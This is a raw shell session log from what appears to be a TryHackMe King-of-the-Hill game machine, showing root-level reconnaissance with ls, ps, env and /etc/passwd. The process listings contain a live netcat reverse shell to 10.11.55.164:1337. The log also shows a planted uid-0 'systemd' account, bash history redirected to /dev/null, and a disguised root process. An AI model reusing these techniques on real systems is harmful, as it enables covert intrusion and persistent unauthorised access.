lrwxrwxrwx  1 root root   32 Apr 16  2018 ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.27.so
cd
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:05 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
env
PWD=/root
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
SHLVL=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
_=/usr/bin/env
OLDPWD=/lib64
w
 23:05:53 up 34 min,  0 users,  load average: 0.63, 0.71, 1.24
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         5  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/u30:0]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       255  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:3]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1589  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:3]
root      1590  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:4]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root         1  0.3  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17528 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:02 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3408 ?        S    23:00   0:00      |   \_ -i
root      4553  0.0  0.3  37080  3440 ?        R    23:05   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.4 106640  4300 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:07 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.1  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ss   23:00   0:14 /li
ls -la /proc/1362/cwd
lrwxrwxrwx 1 root root 0 Dec  8 22:42 /proc/1362/cwd -> /
cd /
ls
bin
boot
cdrom
dev
etc
home
initrd.img
initrd.img.old
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
snap
srv
swap.img
sys
tmp
usr
var
vmlinuz
vmlinuz.old
ls -la /proc/1362/environ
-r-------- 1 root root 0 Dec  8 22:41 /proc/1362/environ
strings /proc/1362/environ
LANG=en_US.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
HOME=/root
LOGNAME=root
USER=root
SHELL=/bin/sh
INVOCATION_ID=51856f5627b0460e9c41fd41c531304e
JOURNAL_STREAM=9:43217

dc /root
-i: line 101: dc: command not found
cd /root
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:06 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
cd
ls -la
total 7260
drwx------  4 root root    4096 Dec  8 23:04 .
drwxr-xr-x 24 root root    4096 Mar 19  2020 ..
lrwxrwxrwx  1 root root       9 Dec  8 23:04 .bash_history -> /dev/null
-rw-r--r--  1 root root    3385 Dec  8 23:00 .bashrc
drwxr-xr-x  3 root root    4096 Mar 19  2020 .local
-rw-------  1 root root     850 Mar 28  2020 .mysql_history
-rw-r--r--  1 root root     206 Mar 28  2020 .profile
drwx------  2 root root    4096 Dec  8 23:00 .ssh
-rw-r--r--  1 root root     173 Mar 20  2020 .wget-hsts
-rw-r--r--  1 root root      38 Mar 28  2020 flag
-r--r--r--  1 root root      11 Dec  8 23:07 king.txt
-rwxr-xr-x  1 root root 7390801 Mar 19  2020 koth
cd /
ls -la
total 1969256
drwxr-xr-x  24 root root       4096 Mar 19  2020 .
drwxr-xr-x  24 root root       4096 Mar 19  2020 ..
drwxr-xr-x   2 root root       4096 Mar 20  2020 bin
drwxr-xr-x   3 root root       4096 Mar 20  2020 boot
drwxr-xr-x   2 root root       4096 Mar 19  2020 cdrom
drwxr-xr-x  17 root root       3700 Dec  8 22:31 dev
drwxr-xr-x  95 root root       4096 Dec  8 23:00 etc
drwxr-xr-x   8 root root       4096 Dec  8 23:00 home
lrwxrwxrwx   1 root root         33 Mar 19  2020 initrd.img -> boot/initrd.img-4.15.0-91-generic
lrwxrwxrwx   1 root root         33 Mar 19  2020 initrd.img.old -> boot/initrd.img-4.15.0-91-generic
drwxr-xr-x  22 root root       4096 Dec  8 22:34 lib
drwxr-xr-x   2 root root       4096 Aug  5  2019 lib64
drwx------   2 root root      16384 Mar 19  2020 lost+found
drwxr-xr-x   2 root root       4096 Aug  5  2019 media
drwxr-xr-x   2 root root       4096 Aug  5  2019 mnt
drwxr-xr-x   2 root root       4096 Aug  5  2019 opt
dr-xr-xr-x 111 root root          0 Dec  8 22:31 proc
drwx------   4 root root       4096 Dec  8 23:04 root
drwxr-xr-x  26 root root        880 Dec  8 22:32 run
drwxr-xr-x   2 root root      12288 Mar 20  2020 sbin
drwxr-xr-x   4 root root       4096 Mar 19  2020 snap
drwxr-xr-x   2 root root       4096 Aug  5  2019 srv
-rw-------   1 root root 2016411648 Mar 19  2020 swap.img
dr-xr-xr-x  13 root root          0 Dec  8 23:05 sys
drwxrwxrwt  10 root root       4096 Dec  8 23:00 tmp
drwxr-xr-x  10 root root       4096 Aug  5  2019 usr
drwxr-xr-x  13 root root       4096 Dec  8 23:01 var
lrwxrwxrwx   1 root root         30 Mar 19  2020 vmlinuz -> boot/vmlinuz-4.15.0-91-generic
lrwxrwxrwx   1 root root         30 Mar 19  2020 vmlinuz.old -> boot/vmlinuz-4.15.0-91-generic
w
 23:07:32 up 35 min,  0 users,  load average: 0.40, 0.62, 1.15
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
root        91  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ipv6_addrconf]
root       100  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kstrp]
root       117  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [charger_manager]
root       167  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ttm_swap]
root       263  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [raid5wq]
root       316  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [jbd2/xvda2-8]
root       317  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ext4-rsv-conver]
root       367  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:1H]
root       399  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [iscsi_eh]
root       402  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-wq]
root       403  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib-comp-unb-wq]
root       404  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_mcast]
root       405  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ib_nl_sa_wq]
root       406  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [rdma_cm]
root       419  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop0]
root       421  0.0  0.0      0     0 ?        S<   22:31   0:00  \_ [loop1]
root      1425  0.0  0.0      0     0 ?        I    22:43   0:00  \_ [kworker/u30:2]
root      1544  0.0  0.0      0     0 ?        I    22:55   0:00  \_ [kworker/u30:1]
root      1591  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/u30:5]
root      1647  0.0  0.0      0     0 ?        I    23:00   0:00  \_ [kworker/0:0]
root      4676  0.0  0.0      0     0 ?        I    23:06   0:00  \_ [kworker/0:2]
root         1  0.2  0.8 159864  9012 ?        Ss   22:31   0:06 /sbin/init maybe-ubiquity
root       397  0.0  1.7 127672 17836 ?        S<s  22:31   0:01 /lib/systemd/systemd-journald
root       408  0.0  0.1  97708  1832 ?        Ss   22:31   0:00 /sbin/lvmetad -f
root       417  0.1  0.4  45560  4512 ?        Ss   22:31   0:02 /lib/systemd/systemd-udevd
systemd+   508  0.0  0.3 141936  3320 ?        Ssl  22:31   0:00 /lib/systemd/systemd-timesyncd
systemd+   610  0.0  0.5  80056  5180 ?        Ss   22:31   0:00 /lib/systemd/systemd-networkd
systemd+   623  0.0  0.5  70640  5288 ?        Ss   22:31   0:00 /lib/systemd/systemd-resolved
tryhack+   729  0.0  0.3 106640  3604 ?        Ssl  22:31   0:00 /home/tryhackme/img
root       743  0.0  0.6  70856  6228 ?        Ss   22:31   0:00 /lib/systemd/systemd-logind
bread      745  0.0  0.4 107104  5028 ?        Ssl  22:31   0:00 /home/bread/main
bread     1549  0.0  0.3  11616  3172 ?        S    23:00   0:00  \_ /bin/bash -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.55.164 1337 >/tmp/f
bread     1556  0.0  0.0   8420   808 ?        S    23:00   0:00      \_ cat /tmp/f
bread     1557  0.0  0.0   6732   900 ?        S    23:00   0:00      \_ sh -i
root      1563  0.0  0.3  18664  3408 ?        S    23:00   0:00      |   \_ -i
root      5479  0.0  0.3  37080  3472 ?        R    23:07   0:00      |       \_ ps aufx
bread     1558  0.0  0.2  17820  2216 ?        S    23:00   0:00      \_ nc 10.11.55.164 1337
syslog     747  0.0  0.4 263036  4368 ?        Ssl  22:31   0:00 /usr/sbin/rsyslogd -n
root       751  0.0  0.3  33996  3360 ?        Ss   22:31   0:00 /usr/sbin/inetd
root       753  0.0  0.1 161076  1676 ?        Ssl  22:31   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       755  0.0  1.7 169096 17148 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
daemon     756  0.0  0.2  28332  2352 ?        Ss   22:31   0:00 /usr/sbin/atd -f
message+   763  0.0  0.4  50108  4356 ?        Ss   22:31   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
root       788  0.0  0.6 286332  6968 ?        Ssl  22:31   0:00 /usr/lib/accountsservice/accounts-daemon
root       789  0.0  0.4 106640  4520 ?        Ssl  22:31   0:00 /root/koth
root       791  0.0  0.3  30028  3100 ?        Ss   22:31   0:00 /usr/sbin/cron -f
root       792  0.3  2.5 557680 25204 ?        Ssl  22:31   0:07 /usr/lib/snapd/snapd
root       800  0.0  1.9 185948 20096 ?        Ssl  22:31   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       809  0.0  0.2  14664  2248 ttyS0    Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220
root       815  0.0  0.1  14888  1904 tty1     Ss+  22:31   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       816  0.0  0.7 291456  7216 ?        Ssl  22:31   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       819  0.0  0.5  72300  5728 ?        Ss   22:31   0:00 /usr/sbin/sshd -D
mysql      841  0.1 17.5 1161928 176800 ?      Sl   22:32   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
ramen      956  0.0  0.7  76644  7476 ?        Ss   22:32   0:00 /lib/systemd/systemd --user
ramen      966  0.0  0.2 111792  2448 ?        S    22:32   0:00  \_ (sd-pam)
root      1362  0.0  1.6 723964 16128 ?        Ssl  22:35   0:01 /usr/bin/systemd-pam
root      1575  4.7  0.0   1000    56 ?        Ds   23:00   0:19 /li
dmesg
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
systemd:x:0:0::/root:/bin/sh
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
tryhackme:x:1000:1000:thm:/home/tryhackme:/bin/bash
telnetd:x:111:113::/nonexistent:/usr/sbin/nologin
food:x:1001:1001:,,,:/home/food:/bin/bash
mysql:x:112:114:MySQL Server,,,:/nonexistent:/bin/false
pasta:x:1002:1002:,,,:/home/pasta:/bin/bash
ramen:x:1003:1003:,,,:/home/ramen:/bin/bash
bread:x:1004:1004:,,,:/home/bread:/bin/bash
steve:x:1005:1005::/home/steve:/bin/bash
w
 23:08:02 up 36 min,  0 users,  load average: 0.39, 0.59, 1.12
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    22:31   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    22:31   0:01  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [cpuhp/0]
root        13  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kdevtmpfs]
root        14  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [netns]
root        15  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [rcu_tasks_kthre]
root        16  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kauditd]
root        17  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenbus]
root        18  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [xenwatch]
root        19  0.0  0.0      0     0 ?        I    22:31   0:00  \_ [kworker/0:1]
root        20  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [khungtaskd]
root        21  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [oom_reaper]
root        22  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [writeback]
root        23  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kcompactd0]
root        24  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [ksmd]
root        25  0.0  0.0      0     0 ?        SN   22:31   0:00  \_ [khugepaged]
root        26  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [crypto]
root        27  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kintegrityd]
root        28  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kblockd]
root        29  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [ata_sff]
root        30  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [md]
root        31  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [edac-poller]
root        32  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [devfreq_wq]
root        33  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [watchdogd]
root        36  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [kswapd0]
root        37  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kworker/u31:0]
root        38  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [ecryptfs-kthrea]
root        80  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [kthrotld]
root        81  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [acpi_thermal_pm]
root        82  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_0]
root        83  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_0]
root        84  0.0  0.0      0     0 ?        S    22:31   0:00  \_ [scsi_eh_1]
root        85  0.0  0.0      0     0 ?        I<   22:31   0:00  \_ [scsi_tmf_1]
